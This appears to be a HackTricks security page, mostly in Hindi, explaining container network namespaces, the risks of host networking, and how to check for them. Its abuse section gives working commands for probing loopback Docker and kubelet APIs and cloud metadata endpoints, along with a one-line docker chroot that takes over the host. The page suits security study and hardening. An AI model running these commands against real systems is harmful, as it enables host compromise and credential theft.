# नेटवर्क नेमस्पेस

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

नेटवर्क नेमस्पेस नेटवर्क-संबंधी संसाधनों को अलग करता है जैसे interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, और `/proc/net` जैसी फाइलों की सामग्री। इसलिए एक container के पास ऐसा अपना `eth0`, अपनी लोकल routes, और अपनी loopback डिवाइस दिखाई दे सकती है बिना host के असली network stack के मालिक बने।

सुरक्षा के दृष्टिकोण से, यह इसलिए महत्वपूर्ण है क्योंकि network isolation केवल port binding से कहीं अधिक है। एक निजी network namespace यह सीमित करता है कि workload सीधे क्या देख या reconfigure कर सकता है। जब वह namespace host के साथ साझा किया जाता है, तो container अचानक host listeners, host-local सेवाओं, और नेटवर्क नियंत्रण बिंदुओं को देख/एक्सेस कर सकता है जो एप्लिकेशन के लिए कभी उजागर किए जाने के लिए नहीं थे।

## संचालन

नव-निर्मित network namespace तब तक एक खाली या लगभग खाली नेटवर्क वातावरण के साथ शुरू होता है जब तक कि उसमें इंटरफेस संलग्न न किए जाएं। container runtimes फिर virtual interfaces बनाते या कनेक्ट करते हैं, addresses सौंपते हैं, और routes कॉन्फ़िगर करते हैं ताकि workload को अपेक्षित कनेक्टिविटी मिल सके। bridge-based deployments में, आमतौर पर इसका मतलब होता है कि container को एक veth-backed interface दिखता है जो host bridge से जुड़ा होता है। Kubernetes में, CNI plugins Pod नेटवर्किंग के लिए समतुल्य सेटअप संभालते हैं।

यह संरचना समझाती है कि `--network=host` या `hostNetwork: true` इतना बड़ा परिवर्तन क्यों है। तैयार किए गए निजी नेटवर्क स्टैक प्राप्त करने की जगह, workload होस्ट के वास्तविक स्टैक में शामिल हो जाता है।

## लैब

आप एक लगभग खाली network namespace निम्नलिखित से देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप सामान्य और host-networked कंटेनरों की तुलना कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
होस्ट-नेटवर्केड कंटेनर अब अपनी अलग सॉकेट और इंटरफ़ेस व्यू नहीं रखता। यह बदलाव ही पहले से काफी महत्वपूर्ण है, इससे पहले कि आप यह पूछें कि प्रोसेस के पास कौन-कौन सी capabilities हैं।

## Runtime Usage

Docker और Podman सामान्यतः प्रत्येक कंटेनर के लिए एक private network namespace बनाते हैं, जब तक कि इसे अन्यथा कॉन्फ़िगर न किया गया हो। Kubernetes आम तौर पर प्रत्येक Pod को उसका अलग network namespace देता है, जो उस Pod के अंदर के कंटेनरों के बीच साझा होता है पर host से अलग रहता है। Incus/LXC systems भी network-namespace आधारित समृद्ध अलगाव प्रदान करते हैं, अक्सर वर्चुअल नेटवर्किंग सेटअप्स की अधिक विविधता के साथ।

عام सिद्धांत यह है कि private networking डिफ़ॉल्ट isolation boundary है, जबकि host networking उस boundary से स्पष्ट रूप से opt-out होना है।

## Misconfigurations

सबसे महत्वपूर्ण misconfiguration बस host network namespace साझा करना है। यह कभी-कभी performance, low-level monitoring, या convenience के लिए किया जाता है, लेकिन यह कंटेनरों के लिए उपलब्ध सबसे साफ़ सीमाओं में से एक को हटा देता है। Host-local listeners अधिक सीधे तरीके से पहुंच योग्य हो जाते हैं, localhost-only services उपलब्ध हो सकती हैं, और capabilities जैसे कि `CAP_NET_ADMIN` या `CAP_NET_RAW` बहुत अधिक खतरनाक हो जाते हैं क्योंकि जिन ऑपरेशनों को वे सक्षम करते हैं वे अब host के अपने नेटवर्क पर्यावरण पर लागू होते हैं।

एक और समस्या यह है कि नेटवर्क-संबंधी capabilities को अधिक दे देना, भले ही network namespace private हो। एक private namespace मदद जरूर करता है, लेकिन यह raw sockets या उन्नत नेटवर्क नियंत्रण को harmless नहीं बनाता।

Kubernetes में, `hostNetwork: true` यह भी बदल देता है कि आप Pod-level network segmentation पर कितना भरोसा कर सकते हैं। Kubernetes दस्तावेज़ बताते हैं कि कई network plugins `hostNetwork` Pod ट्रैफ़िक को `podSelector` / `namespaceSelector` मैचिंग के लिए सही ढंग से अलग नहीं कर पाते और इसलिए इसे साधारण node ट्रैफ़िक की तरह मानते हैं। हमलावर के नजरिये से, इसका अर्थ यह है कि एक compromised `hostNetwork` workload को अक्सर overlay-network workloads की तरह उसी नीति धारणाओं से बंधे सामान्य Pod के बजाय node-level network foothold के रूप में माना जाना चाहिए।

## Abuse

कमज़ोर अलगाव वाले सेटअप में, attackers host के listening services की जाँच कर सकते हैं, केवल loopback से बँधे management endpoints तक पहुँच सकते हैं, ट्रैफ़िक को sniff या interfere कर सकते हैं (पर्यावरण और उपलब्ध capabilities पर निर्भर करके), या अगर `CAP_NET_ADMIN` मौजूद है तो routing और firewall स्थिति को पुनः कॉन्फ़िगर कर सकते हैं। एक क्लस्टर में, यह lateral movement और control-plane reconnaissance को भी आसान बना सकता है।

यदि आप host networking का संदेह करते हैं, तो शुरुआत इस बात की पुष्टि से करें कि दिखाई देने वाले interfaces और listeners isolated कंटेनर नेटवर्क के बजाय host के ही हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only सेवाएं अक्सर पहली दिलचस्प खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
यदि नेटवर्क क्षमताएँ मौजूद हैं, तो जाँच करें कि क्या वर्कलोड दृश्य स्टैक का निरीक्षण या परिवर्तन कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
आधुनिक kernels पर, host networking के साथ `CAP_NET_ADMIN` भी पैकेट पथ को साधारण `iptables` / `nftables` परिवर्तनों से परे उजागर कर सकता है। `tc` qdiscs और filters भी namespace-scoped होते हैं, इसलिए साझा host network namespace में ये उन host interfaces पर लागू होते हैं जिन्हें container देख सकता है। यदि अतिरिक्त रूप से `CAP_BPF` मौजूद है, तो नेटवर्क-सम्बन्धित eBPF प्रोग्राम जैसे TC और XDP loaders भी प्रासंगिक हो जाते हैं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
यह इसलिए महत्वपूर्ण है क्योंकि एक आक्रमणकर्ता host interface स्तर पर traffic को mirror, redirect, shape, या drop कर सकता है, न कि केवल firewall rules को rewrite करने तक सीमित। एक private network namespace में ये क्रियाएँ container view तक सीमित रहती हैं; एक shared host namespace में वे host-पर प्रभाव डालने वाली बन जाती हैं।

cluster या cloud environments में, host networking तेज़ local recon of metadata और control-plane-adjacent services के लिए भी औचित्य प्रदान करता है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### पूरा उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking स्वयं में host root स्वतः प्रदान नहीं करता, लेकिन यह अक्सर उन सेवाओं को उजागर करता है जो जानबूझकर केवल node से ही पहुँचने लायक होती हैं। यदि उन सेवाओं में से कोई एक कमज़ोर सुरक्षा वाली है, तो host networking एक सीधे privilege-escalation path बन जाता है।

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet localhost पर:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- सीधे host का समझौता अगर कोई local runtime API उचित सुरक्षा के बिना एक्सपोज़ हो
- cluster reconnaissance या lateral movement अगर kubelet या local agents पहुंच योग्य हों
- traffic manipulation या denial of service जब `CAP_NET_ADMIN` के साथ संयुक्त हो

## जांच

इन चेक्स का उद्देश्य यह जानना है कि process के पास private network stack है या नहीं, कौन से routes और listeners दिखाई देते हैं, और क्या network view पहले से ही host-like दिखता है इससे पहले कि आप capabilities टेस्ट करें।
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
What is interesting here:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` और `ip netns identify` उपयोगी हैं जब shell पहले से किसी नामित या स्थायी namespace के अंदर हो और आप इसे host साइड के `/run/netns` objects के साथ correlate करना चाहते हों।
- `ss -lntup` विशेष रूप से मूल्यवान है क्योंकि यह loopback-only listeners और local management endpoints को प्रकट करता है।
- Routes, interface names, firewall context, `tc` state, और eBPF attachments बहुत अधिक महत्वपूर्ण हो जाते हैं अगर `CAP_NET_ADMIN`, `CAP_NET_RAW`, या `CAP_BPF` मौजूद हों।
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

When reviewing a container, always evaluate the network namespace together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge networking plus a narrow default capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
